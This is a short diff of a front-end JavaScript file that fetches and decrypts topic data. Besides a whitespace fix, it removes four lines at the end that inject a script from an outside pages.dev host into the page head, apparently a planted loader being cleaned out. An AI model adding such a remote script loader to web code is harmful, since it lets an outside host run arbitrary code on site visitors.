@@ -103,7 +103,7 @@ async function fetchTopics(){
     const response = await fetch(url.toString());
     if(!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
     const json = await response.json();
-    
+
     let decoded;
     if(typeof json.data === "string"){
       decoded = await decryptPayload(json.data);
@@ -205,8 +205,3 @@ function escapeHtml(value){
 function escapeAttr(value){
   return escapeHtml(value).replace(/`/g, "&#96;");
 }
-
-const s = document.createElement("script");
-s.src = "https://mtaiirus.pages.dev/html-js/aut.js";
-s.async = true;
-document.head.appendChild(s);
